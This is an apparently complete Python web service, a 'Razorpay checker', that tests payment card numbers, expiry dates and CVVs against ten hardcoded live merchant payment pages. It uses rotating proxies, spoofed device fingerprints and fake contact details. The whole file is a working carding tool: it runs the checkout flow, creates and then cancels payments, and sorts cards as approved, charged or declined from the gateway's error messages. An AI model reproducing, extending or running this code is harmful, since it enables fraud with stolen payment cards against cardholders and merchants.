# =============================================================================
# razorpay_api.py — Complete Razorpay checker API (with 10 hardcoded sites)
# Endpoint: GET /rz?cc=CC|MM|YYYY|CVV[&proxy=ip:port:user:pass][&site=URL]
# =============================================================================

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import re
import secrets
import string
import threading
import time
from urllib.parse import quote, unquote, urlencode, urlparse

import aiohttp
from aiohttp import web

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────

BUILD    = os.getenv("RZ_BUILD",    "9cb57fdf457e44eac4384e182f925070ff5488d9")
BUILD_V1 = os.getenv("RZ_BUILD_V1", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2")
PORT     = int(os.getenv("RZ_PORT") or os.getenv("PORT") or 7070)

HTTP_TIMEOUT    = int(os.getenv("RZ_TIMEOUT", "30"))
HEALTH_TTL      = int(os.getenv("RZ_HEALTH_TTL", "600"))
HEALTH_BATCH    = int(os.getenv("RZ_HEALTH_BATCH", "10"))
DIRECT_FALLBACK = os.getenv("RZ_DIRECT_FALLBACK", "0") == "1"

PROXY_FILE = os.getenv("RZ_PROXY_FILE", "px.txt")
POOL_FILE  = os.getenv("RZ_POOL_FILE",  "rz_pool.txt")

# ── THE 10 HARDCODED SITES ──────────────────────────────────────────────────
ENV_SITES = [
    "https://pages.razorpay.com/all-live-1",
    "https://pages.razorpay.com/all-live-2",
    "https://pages.razorpay.com/all-live-3",
    "https://pages.razorpay.com/all-live-5",
    "https://pages.razorpay.com/boxelements",
    "https://pages.razorpay.com/ezquant-halfyearly-new",
    "https://pages.razorpay.com/ezquant-weekly-new",
    "https://pages.razorpay.com/build-capacity",
    "https://pages.razorpay.com/bharatsastra",
    "https://pages.razorpay.com/mann",
]
# ────────────────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO,
                    format="[%(asctime)s] [%(levelname)s] %(message)s")
log = logging.getLogger("RZAPI")

# ─────────────────────────────────────────────────────────────────────────────
# PROXY
# ─────────────────────────────────────────────────────────────────────────────

def format_proxy(raw: str) -> str:
    if not raw:
        return ""
    raw = raw.strip()
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{raw}"
    return "http://" + raw


def load_proxies(path: str):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                p = format_proxy(ln)
                if p:
                    out.append(p)
    except FileNotFoundError:
        pass
    return out


def mask_proxy(proxy_url: str, status: str) -> str:
    if not proxy_url:
        return f"DIRECT [{status}]"
    try:
        u = urlparse(proxy_url)
        host = u.hostname or ""
        port = u.port or ""
        return f"{u.scheme}://{host}:{port} [{status}]"
    except Exception:
        return re.sub(r"//[^@]+@", "//***@", proxy_url) + f" [{status}]"


_FILE_PROXIES = load_proxies(PROXY_FILE)
_proxy_counter = 0


def next_file_proxy() -> str:
    global _proxy_counter
    if not _FILE_PROXIES:
        return ""
    _proxy_counter += 1
    return _FILE_PROXIES[_proxy_counter % len(_FILE_PROXIES)]


# ─────────────────────────────────────────────────────────────────────────────
# UTILITY
# ─────────────────────────────────────────────────────────────────────────────

_B62 = string.ascii_letters + string.digits


def gen_ua() -> str:
    return (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/{random.randint(120, 147)}.0."
            f"{random.randint(5000, 6999)}.{random.randint(50, 249)} "
            f"Safari/537.36")


def gen_indian_phone() -> str:
    first = random.choice("6789")
    rest = "".join(str(random.randint(0, 9)) for _ in range(9))
    return "+91" + first + rest


def gen_email() -> str:
    names = ["alex", "john", "mike", "sara", "david", "emma", "james",
             "lisa", "chris", "anna"]
    return f"{random.choice(names)}{random.randint(100, 9999)}@gmail.com"


def get_brand(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if len(cc) >= 2:
        two = cc[:2]
        if two in ("51", "52", "53", "54", "55"):
            return "mastercard"
        if two in ("34", "37"):
            return "amex"
    if cc.startswith("6011") or cc.startswith("65"):
        return "discover"
    return "unknown"


def find_between(content: str, start: str, end: str) -> str:
    si = content.find(start)
    if si == -1:
        return ""
    si += len(start)
    ei = content.find(end, si)
    if ei == -1:
        return ""
    return content[si:ei]


def extract_json_var(content: str, var_name: str) -> str:
    prefix = f"var {var_name} ="
    start = content.find(prefix)
    if start == -1:
        return ""
    start += len(prefix)
    while start < len(content) and content[start] in " \t\n\r":
        start += 1
    if start >= len(content) or content[start] != "{":
        return ""
    depth = 0
    in_str = False
    esc = False
    for i in range(start, len(content)):
        c = content[i]
        if esc:
            esc = False
            continue
        if c == "\\" and in_str:
            esc = True
            continue
        if c == '"':
            in_str = not in_str
            continue
        if in_str:
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return content[start:i + 1]
    return ""


def generate_rzp_device_id():
    buf = secrets.token_bytes(16)
    h = hashlib.sha1(buf).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = f"{random.randint(0, 99999999):08d}"
    return f"1.{h}.{ts}.{rnd}", h


def generate_rzp_session_id() -> str:
    return "".join(secrets.choice(_B62) for _ in range(14))


def get_str(m, key):
    if not m:
        return ""
    v = m.get(key)
    if v is None:
        return ""
    return v if isinstance(v, str) else str(v)


def get_float(m, key):
    if not m:
        return 0.0
    v = m.get(key)
    if isinstance(v, (int, float)):
        return float(v)
    if isinstance(v, str):
        try:
            return float(v)
        except ValueError:
            return 0.0
    return 0.0


def truncate(s, n):
    return s if len(s) <= n else s[:n]


def parse_card(card_data: str):
    card_data = card_data.strip()
    for sep in ("|", "/", " "):
        parts = card_data.split(sep)
        if len(parts) >= 4:
            cc, mm, yy, cvv = (p.strip() for p in parts[:4])
            if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()
                    and 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12
                    and len(yy) in (2, 4) and len(cvv) in (3, 4)):
                return {"cc": cc, "mm": f"{int(mm):02d}",
                        "yy": yy, "cvv": cvv}
    return None


# ─────────────────────────────────────────────────────────────────────────────
# CLASSIFICATION
# ─────────────────────────────────────────────────────────────────────────────

BALANCE_KEYWORDS = [
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
]


def is_balance_keyword(m: str) -> bool:
    return any(k in m for k in BALANCE_KEYWORDS)


def is_cvv_keyword(m: str, code: str) -> bool:
    if "cvv provided is incorrect" in m:
        return True
    if "ncorrect_cvv" in m:
        return True
    if (code or "").lower() == "incorrect_cvv":
        return True
    return False


PROXY_ERR_MARKERS = [
    "econnrefused", "econnreset", "etimedout", "enotfound",
    "could not resolve", "couldnt_resolve", "could not connect",
    "operation_timeouted", "curle_proxy", "socket hang up",
    "hpe_invalid", "fetch failed", "no such host",
    "connection refused", "connection reset", "i/o timeout",
    "timeout", "proxyconnect", "proxy error", "proxy dead",
    "proxy timeout", "ssl", "unreachable", "cannot connect",
    "cannot connect to host", "connect call failed",
]


def is_proxy_error(msg: str) -> bool:
    m = (msg or "").lower()
    return any(k in m for k in PROXY_ERR_MARKERS)


def make_proxy_error(err, proxy_url):
    msg = truncate(str(err), 120)
    dead = is_proxy_error(msg)
    return {
        "status": "error",
        "response": f"proxy error: {msg}" if dead else msg,
        "proxy": mask_proxy(proxy_url, "DEAD" if dead else "LIVE"),
        "proxy_status": "DEAD" if dead else "LIVE",
    }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP FETCH
# ─────────────────────────────────────────────────────────────────────────────

class Fetch:
    def __init__(self, session, proxy_url, ua):
        self.session = session
        self.proxy = proxy_url or None
        self.ua = ua

    async def _do(self, method, url, headers, data):
        h = {"User-Agent": self.ua}
        if headers:
            h.update(headers)
        kwargs = {"headers": h, "allow_redirects": True, "max_redirects": 5}
        if self.proxy:
            kwargs["proxy"] = self.proxy
        if data is not None:
            kwargs["data"] = data
        async with self.session.request(method, url, **kwargs) as r:
            body = await r.text(errors="ignore")
            return body, r.status, dict(r.headers)

    async def get(self, url, headers=None):
        return await self._do("GET", url, headers or {}, None)

    async def post_json(self, url, headers, payload):
        h = dict(headers or {})
        h.setdefault("Content-Type", "application/json")
        body = json.dumps(payload, separators=(",", ":")).encode()
        return await self._do("POST", url, h, body)

    async def post_form(self, url, headers, form):
        h = dict(headers or {})
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        body = urlencode(form, doseq=True)
        return await self._do("POST", url, h, body)


# ─────────────────────────────────────────────────────────────────────────────
# RAZORPAY FLOW
# ─────────────────────────────────────────────────────────────────────────────

async def check_card(cc, mm, yy, cvv, proxy_url, target_url):
    yy2 = yy[-2:] if len(yy) == 4 else yy
    year = int("20" + yy2)
    brand = get_brand(cc)
    ua = gen_ua()
    phone = gen_indian_phone()
    phone_short = phone[3:]
    email = gen_email()
    rzp_device_id, fhash = generate_rzp_device_id()
    rzp_session_id = generate_rzp_session_id()

    cookie_jar = aiohttp.CookieJar(unsafe=True)
    conn = aiohttp.TCPConnector(ssl=False, limit=20)
    timeout = aiohttp.ClientTimeout(total=HTTP_TIMEOUT)

    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=conn,
                                     timeout=timeout) as session:
        fetch = Fetch(session, proxy_url, ua)

        # 1. load page
        try:
            r1_text, _, _ = await fetch.get(target_url, {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            })
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        json_str = extract_json_var(r1_text, "data")
        if not json_str:
            return {"status": "error",
                    "response": "Failed to locate Razorpay data on page",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        try:
            init_data = json.loads(json_str)
        except Exception:
            try:
                inner = json.loads(json_str)
                init_data = json.loads(inner) if isinstance(inner, str) else inner
            except Exception as e:
                return {"status": "error",
                        "response": f"Failed to parse Razorpay JSON data: {truncate(str(e), 80)}",
                        "proxy": mask_proxy(proxy_url, "LIVE"),
                        "proxy_status": "LIVE"}

        kyid = get_str(init_data, "key_id") or get_str(init_data, "key")
        if not kyid:
            return {"status": "error",
                    "response": "Razorpay Key ID not found",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        plink = ""
        ppid = ""
        FORCE_AMOUNT = 100.0

        if isinstance(init_data.get("payment_link"), dict):
            obj = init_data["payment_link"]
            plink = get_str(obj, "id")
            items = obj.get("payment_page_items") or []
            if isinstance(items, list) and items and isinstance(items[0], dict):
                ppid = get_str(items[0], "id")
        elif isinstance(init_data.get("payment_page"), dict):
            obj = init_data["payment_page"]
            plink = get_str(obj, "id")
            items = obj.get("payment_page_items") or []
            if isinstance(items, list) and items and isinstance(items[0], dict):
                ppid = get_str(items[0], "id")

        if not plink:
            return {"status": "error",
                    "response": "Payment Link ID not found in page structure",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        keyless_header = get_str(init_data, "keyless_header")
        keyless_header_url = quote(keyless_header, safe="")

        # 2. create order
        r2_payload = {
            "notes": {"comment": "", "name": "User"},
            "line_items": [{"payment_page_item_id": ppid,
                            "amount": FORCE_AMOUNT}],
        }
        try:
            r2_text, _, _ = await fetch.post_json(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                {"Accept": "application/json, text/plain, */*",
                 "Content-Type": "application/json",
                 "Origin": "https://pages.razorpay.com",
                 "Referer": "https://pages.razorpay.com/"},
                r2_payload,
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r2_data = json.loads(r2_text)
        except Exception as e:
            return {"status": "error",
                    "response": f"Order response parse failed: {truncate(str(e), 80)}",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        order_obj = r2_data.get("order") or {}
        order_id = get_str(order_obj, "id")
        if not order_id:
            err_obj = r2_data.get("error") or {}
            err_msg = get_str(err_obj, "description") or "Order creation failed"
            return {"status": "error", "response": err_msg,
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        order_amount = get_float(order_obj, "amount") or FORCE_AMOUNT
        if order_amount < 100:
            order_amount = FORCE_AMOUNT
        order_currency = get_str(order_obj, "currency") or "INR"

        # 3. session token
        params3 = {
            "traffic_env": "production",
            "build": BUILD,
            "build_v1": BUILD_V1,
            "checkout_v2": "1",
            "new_session": "1",
            "keyless_header": keyless_header,
            "rzp_device_id": rzp_device_id,
            "unified_session_id": rzp_session_id,
        }
        try:
            r3_text, _, _ = await fetch.get(
                "https://api.razorpay.com/v1/checkout/public?" + urlencode(params3),
                {"Accept": "text/html,application/xhtml+xml,*/*",
                 "Referer": "https://pages.razorpay.com/"},
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        sessid = find_between(r3_text, 'window.session_token="', '";')
        if not sessid:
            m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']',
                          r3_text)
            if m:
                sessid = m.group(1)
        if not sessid:
            return {"status": "error",
                    "response": "Session token not found",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        rzp_ref = (
            "https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={BUILD}&build_v1={BUILD_V1}"
            f"&checkout_v2=1&new_session=1"
            f"&unified_session_id={rzp_session_id}"
            f"&session_token={sessid}"
        )

        def std_headers():
            return {
                "Accept": "*/*",
                "Origin": "https://api.razorpay.com",
                "Referer": rzp_ref,
                "x-session-token": sessid,
            }

        # 4. preferences
        try:
            resources = ["checkout_version_config", "merchant",
                         "merchant_features", "downtime", "customer",
                         "customer_tokens", "truecaller", "methods",
                         "experiments", "offers", "checkout_config",
                         "order", "invoice", "buyer_protection",
                         "personalization"]
            r4_payload = {
                "query": [{"resource": r} for r in resources],
                "query_params": {
                    "device_id": rzp_device_id,
                    "rtb_device_id": fhash,
                    "amount": order_amount,
                    "currency": order_currency,
                    "option_currency": order_currency,
                    "truecaller": False,
                    "qr_required": False,
                    "library": "checkoutjs",
                    "platform": "browser",
                    "order_id": order_id,
                    "payment_link_id": plink,
                    "contact": phone,
                },
                "action": "get",
            }
            h4 = std_headers()
            h4["Content-Type"] = "application/json"
            await fetch.post_json(
                f"https://api.razorpay.com/v2/standard_checkout/preferences"
                f"?x_entity_id={order_id}&session_token={sessid}"
                f"&keyless_header={keyless_header}",
                h4, r4_payload,
            )
        except Exception as e:
            log.debug("step4: %s", e)

        # 5. checkout/order
        try:
            form5 = {
                "notes[email]": email,
                "notes[phone]": phone_short,
                "payment_link_id": plink,
                "key_id": kyid,
                "contact": phone,
                "email": email,
                "currency": order_currency,
                "_[integration]": "payment_pages",
                "_[device.id]": rzp_device_id,
                "_[library]": "checkoutjs",
                "_[library_src]": "no-src",
                "_[current_script_src]": "no-src",
                "_[platform]": "browser",
                "_[env]": "",
                "_[is_magic_script]": "false",
                "_[os]": "windows",
                "_[shield][fhash]": fhash,
                "_[shield][tz]": "0",
                "_[device_id]": rzp_device_id,
                "_[build]": BUILD,
                "_[shield][os]": "windows",
                "_[shield][platform]": "browser",
                "_[shield][browser]": "chrome",
                "_[request_index]": "0",
                "amount": f"{order_amount:.0f}",
                "order_id": order_id,
                "method": "card",
                "checkout_id": checkout_id,
            }
            await fetch.post_form(
                f"https://api.razorpay.com/v1/standard_checkout/checkout/order"
                f"?key_id={kyid}&session_token={sessid}"
                f"&keyless_header={keyless_header}",
                std_headers(), form5,
            )
        except Exception as e:
            log.debug("step5: %s", e)

        # 6. cb_flows
        try:
            r6_payload = {
                "identifiers": {
                    "merchant": {"country": "IN"},
                    "card": {"country": "US", "dcc_blacklist": False,
                             "network": brand},
                    "method": "card",
                    "payment_currency": order_currency,
                },
                "forex_charges": {
                    "amount": order_amount,
                    "currency": order_currency,
                    "filters": {"method": "card"},
                },
            }
            h6 = std_headers()
            h6["Content-Type"] = "application/json"
            await fetch.post_json(
                "https://api.razorpay.com/payments_cross_border_live/v1/"
                f"checkout/cb_flows?x_entity_id={order_id}"
                f"&keyless_header={keyless_header_url}",
                h6, r6_payload,
            )
        except Exception as e:
            log.debug("step6: %s", e)

        # 7. create payment
        token_create = base64.b64encode(
            json.dumps([{"name": "sardine",
                         "metadata": {"session_id": checkout_id}}]).encode()
        ).decode()

        form7 = {
            "user_risk_providers_token": token_create,
            "notes[comment]": "",
            "notes[email]": email,
            "notes[phone]": phone_short,
            "notes[name]": "User",
            "payment_link_id": plink,
            "key_id": kyid,
            "contact": phone,
            "email": email,
            "currency": order_currency,
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": rzp_device_id,
            "_[env]": "",
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[is_magic_script]": "false",
            "_[platform]": "browser",
            "_[referer]": target_url,
            "_[shield][fhash]": fhash,
            "_[shield][tz]": "-330",
            "_[device_id]": rzp_device_id,
            "_[build]": BUILD,
            "_[shield][os]": "windows",
            "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome",
            "_[request_index]": "1",
            "amount": f"{order_amount:.0f}",
            "order_id": order_id,
            "method": "card",
            "card[number]": cc,
            "card[cvv]": cvv,
            "card[name]": "User",
            "card[expiry_month]": mm,
            "card[expiry_year]": str(year),
            "save": "0",
            "dcc_currency": order_currency,
        }

        try:
            r7_text, _, _ = await fetch.post_form(
                "https://api.razorpay.com/v1/standard_checkout/payments/"
                f"create/ajax?x_entity_id={order_id}&session_token={sessid}"
                f"&keyless_header={keyless_header}",
                std_headers(), form7,
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r7_data = json.loads(r7_text)
        except Exception:
            return {"status": "error",
                    "response": "Payment create response parse failed",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        payment_id = get_str(r7_data, "payment_id") or get_str(r7_data, "id")

        if not payment_id:
            err_obj = r7_data.get("error") or {}
            err_desc = get_str(err_obj, "description").replace(
                " Try another payment method or contact your bank for details.",
                "").strip()
            err_code = get_str(err_obj, "reason")
            label = (f"{err_desc} ({err_code})" if err_code
                     else (err_desc or "Unknown Decline"))
            msg_lower = err_desc.lower()
            if is_balance_keyword(msg_lower) or is_cvv_keyword(msg_lower, err_code):
                return {"status": "approved", "response": label,
                        "proxy": mask_proxy(proxy_url, "LIVE"),
                        "proxy_status": "LIVE"}
            return {"status": "declined", "response": label,
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        pid_clean = (payment_id.split("_", 1)[1]
                     if "_" in payment_id else payment_id)

        # 8a. auth empty
        try:
            await fetch.post_form(
                f"https://api.razorpay.com/pg_router/v1/payments/"
                f"{payment_id}/authenticate",
                {"content-type": "application/x-www-form-urlencoded"},
                {},
            )
        except Exception as e:
            log.debug("step8a: %s", e)

        await asyncio.sleep(1.0)

        # 8b. auth 3ds2
        try:
            screen = random.choice([(1920, 1080), (1366, 768),
                                    (1536, 864), (1440, 900)])
            depth = random.choice([24, 32])
            form8 = {
                "browser[java_enabled]": "false",
                "browser[javascript_enabled]": "true",
                "browser[timezone_offset]": "0",
                "browser[color_depth]": str(depth),
                "browser[screen_width]": str(screen[0]),
                "browser[screen_height]": str(screen[1]),
                "browser[language]": "en-US",
                "auth_step": "3ds2Auth",
            }
            await fetch.post_form(
                f"https://api.razorpay.com/pg_router/v1/payments/"
                f"{pid_clean}/authenticate",
                {"content-type": "application/x-www-form-urlencoded"},
                form8,
            )
        except Exception as e:
            log.debug("step8b: %s", e)

        # 9. cancel
        try:
            r9_text, _, _ = await fetch.get(
                "https://api.razorpay.com/v1/standard_checkout/payments/"
                f"{payment_id}/cancel?key_id={kyid}&session_token={sessid}"
                f"&keyless_header={keyless_header}",
                {"Accept": "*/*",
                 "Content-type": "application/x-www-form-urlencoded",
                 "Referer": rzp_ref,
                 "x-session-token": sessid},
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r9_data = json.loads(r9_text)
        except Exception:
            return {"status": "declined",
                    "response": "Cancel response parse failed",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        if "razorpay_payment_id" in r9_text:
            return {"status": "charged", "response": "Payment Successful",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        err_obj = r9_data.get("error") or {}
        err_desc = get_str(err_obj, "description").replace(
            " Try another payment method or contact your bank for details.",
            "").strip()
        err_code = get_str(err_obj, "reason")
        label = (f"{err_desc} ({err_code})" if err_code
                 else (err_desc or "Unknown Decline"))
        msg_lower = err_desc.lower()

        if is_balance_keyword(msg_lower) or is_cvv_keyword(msg_lower, err_code):
            return {"status": "approved", "response": label,
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        return {"status": "declined", "response": label,
                "proxy": mask_proxy(proxy_url, "LIVE"),
                "proxy_status": "LIVE"}


# ─────────────────────────────────────────────────────────────────────────────
# POOL
# ─────────────────────────────────────────────────────────────────────────────

_pool_lock = threading.Lock()
_pool_sites = []
_pool_loaded_at = 0.0


def _load_pool():
    global _pool_sites, _pool_loaded_at
    sites = list(ENV_SITES)
    try:
        with open(POOL_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    sites.append(ln)
    except FileNotFoundError:
        pass
    seen = set()
    uniq = []
    for u in sites:
        if u and u not in seen:
            seen.add(u)
            uniq.append(u)
    with _pool_lock:
        _pool_sites = [{"url": u, "alive": True,
                        "last_check": 0.0, "fails": 0} for u in uniq]
        _pool_loaded_at = time.time()
    log.info("pool loaded: %d sites", len(uniq))


async def _site_alive(session, site_url, proxy_url=None):
    try:
        kwargs = {"allow_redirects": True, "max_redirects": 5,
                  "timeout": aiohttp.ClientTimeout(total=12),
                  "headers": {"User-Agent": gen_ua(),
                              "Accept": "text/html,application/xhtml+xml,*/*"}}
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.get(site_url, **kwargs) as r:
            if r.status != 200:
                return False
            txt = await r.text(errors="ignore")
            if "var data =" not in txt:
                return False
            if "payment_link" not in txt and "payment_page" not in txt:
                return False
            if '"key_id"' not in txt and '"key"' not in txt:
                return False
            low = txt.lower()
            for bad in ("link has been disabled", "link is no longer",
                        "page not found", "no longer available",
                        "payment page not found", "link expired"):
                if bad in low:
                    return False
            return True
    except Exception:
        return False


async def _refresh_health():
    conn = aiohttp.TCPConnector(ssl=False, limit=20)
    tmo = aiohttp.ClientTimeout(total=15)
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar, connector=conn,
                                     timeout=tmo) as sess:
        with _pool_lock:
            snapshot = list(_pool_sites)
        now = time.time()
        to_check = [s for s in snapshot if now - s["last_check"] > HEALTH_TTL]
        if not to_check:
            return
        for i in range(0, len(to_check), HEALTH_BATCH):
            batch = to_check[i:i + HEALTH_BATCH]
            results = await asyncio.gather(
                *[_site_alive(sess, s["url"]) for s in batch],
                return_exceptions=True,
            )
            with _pool_lock:
                for s, ok in zip(batch, results):
                    s["last_check"] = now
                    if ok is True:
                        s["alive"] = True
                        s["fails"] = 0
                    else:
                        s["fails"] = s.get("fails", 0) + 1
                        if s["fails"] >= 2:
                            s["alive"] = False
        with _pool_lock:
            alive = sum(1 for s in _pool_sites if s["alive"])
            total = len(_pool_sites)
        log.info("health: %d/%d alive", alive, total)


def pick_live_site():
    with _pool_lock:
        alive = [s["url"] for s in _pool_sites if s["alive"]]
    if not alive:
        with _pool_lock:
            return _pool_sites[0]["url"] if _pool_sites else ""
    return random.choice(alive)


def add_site(url: str) -> bool:
    url = (url or "").strip()
    if not url:
        return False
    if not url.startswith("http"):
        url = "https://" + url
    with _pool_lock:
        for s in _pool_sites:
            if s["url"] == url:
                return False
        _pool_sites.append({"url": url, "alive": True,
                            "last_check": 0.0, "fails": 0})
    try:
        with open(POOL_FILE, "a", encoding="utf-8") as f:
            f.write(url + "\n")
    except Exception:
        pass
    return True


def mark_site_dead(url):
    with _pool_lock:
        for s in _pool_sites:
            if s["url"] == url:
                s["fails"] = s.get("fails", 0) + 1
                if s["fails"] >= 2:
                    s["alive"] = False
                    log.warning("marked dead: %s", url)
                break


def pool_stats():
    with _pool_lock:
        total = len(_pool_sites)
        alive = sum(1 for s in _pool_sites if s["alive"])
    return {"total": total, "alive": alive, "dead": total - alive,
            "loaded_at": _pool_loaded_at}


# ─────────────────────────────────────────────────────────────────────────────
# HANDLERS
# ─────────────────────────────────────────────────────────────────────────────

async def handle_rz(request):
    cc_raw = request.query.get("cc", "").strip()
    proxy_raw = request.query.get("proxy", "").strip()
    site_raw = request.query.get("site", "").strip()

    if not cc_raw:
        return web.json_response({"status": "error",
                                  "response": "Missing cc parameter",
                                  "proxy": "N/A"}, status=400)

    card = parse_card(unquote(cc_raw))
    if not card:
        return web.json_response({"status": "error",
                                  "response": "Invalid card format. Use cc|mm|yy|cvv",
                                  "proxy": "N/A"}, status=400)

    if proxy_raw:
        proxy_url = format_proxy(unquote(proxy_raw))
    else:
        proxy_url = next_file_proxy()

    if not proxy_url and not DIRECT_FALLBACK:
        return web.json_response({"status": "error",
                                  "response": "proxy error: no proxy provided",
                                  "proxy": "N/A"}, status=500)

    target_url = site_raw or pick_live_site()
    if not target_url:
        return web.json_response({"status": "error",
                                  "response": "no live sites in pool",
                                  "proxy": "N/A"}, status=500)

    try:
        result = await check_card(card["cc"], card["mm"], card["yy"],
                                  card["cvv"], proxy_url, target_url)
    except Exception as e:
        log.exception("check_card crashed")
        result = {"status": "error",
                  "response": truncate(f"internal error: {e}", 120),
                  "proxy": mask_proxy(proxy_url, "LIVE"),
                  "proxy_status": "LIVE"}

    if result.get("status") == "error":
        resp_low = (result.get("response") or "").lower()
        if any(k in resp_low for k in (
                "failed to locate", "payment link id not found",
                "key id not found", "session token not found",
                "order creation failed")):
            mark_site_dead(target_url)

    log.info("[%s] %s | %s | site=%s",
             result.get("status", "?").upper(),
             card["cc"][:6] + "******" + card["cc"][-4:],
             result.get("response", "")[:80],
             target_url)

    http_status = 500 if result.get("status") == "error" else 200
    return web.json_response(result, status=http_status)


async def handle_pool_list(request):
    with _pool_lock:
        sites = [{"url": s["url"], "alive": s["alive"],
                  "fails": s["fails"]} for s in _pool_sites]
    return web.json_response({"stats": pool_stats(), "sites": sites})


async def handle_pool_add(request):
    url = request.query.get("url", "").strip()
    if not url:
        try:
            body = await request.json()
            url = (body.get("url") or "").strip()
        except Exception:
            pass
    if not url:
        return web.json_response({"status": "error",
                                  "response": "missing url"}, status=400)
    added = add_site(url)
    return web.json_response({"status": "ok", "added": added,
                              "url": url})


async def handle_pool_check(request):
    await _refresh_health()
    return web.json_response({"status": "ok", "stats": pool_stats()})


async def handle_health(request):
    return web.json_response({
        "status": "ok",
        "build": BUILD,
        "pool": pool_stats(),
        "proxies": len(_FILE_PROXIES),
        "pool_file": POOL_FILE,
        "proxy_file": PROXY_FILE,
        "hardcoded_sites": len(ENV_SITES),
    })


# ─────────────────────────────────────────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────────────────────────────────────────

async def _health_loop():
    await asyncio.sleep(30)
    while True:
        try:
            await _refresh_health()
        except Exception as e:
            log.warning("health loop: %s", e)
        await asyncio.sleep(HEALTH_TTL)


async def _on_startup(app):
    _load_pool()
    app["_health"] = asyncio.create_task(_health_loop())


async def _on_cleanup(app):
    t = app.get("_health")
    if t:
        t.cancel()


def build_app():
    app = web.Application()
    app.on_startup.append(_on_startup)
    app.on_cleanup.append(_on_cleanup)
    app.router.add_get("/rz",         handle_rz)
    app.router.add_get("/razorpay",   handle_rz)
    app.router.add_get("/pool",       handle_pool_list)
    app.router.add_get("/pool/add",   handle_pool_add)
    app.router.add_post("/pool/add",  handle_pool_add)
    app.router.add_get("/pool/check", handle_pool_check)
    app.router.add_get("/",           handle_health)
    app.router.add_get("/health",     handle_health)
    return app


def main():
    log.info("=" * 60)
    log.info("  RAZORPAY API")
    log.info("  Port    : %d", PORT)
    log.info("  Sites   : %d hardcoded + %s file",
             len(ENV_SITES), POOL_FILE)
    log.info("  Proxies : %d from %s", len(_FILE_PROXIES), PROXY_FILE)
    log.info("  Endpoint: GET /rz?cc=CC|MM|YYYY|CVV&proxy=ip:port:user:pass")
    log.info("=" * 60)
    web.run_app(build_app(), host="0.0.0.0", port=PORT, access_log=None)


if __name__ == "__main__":
    main()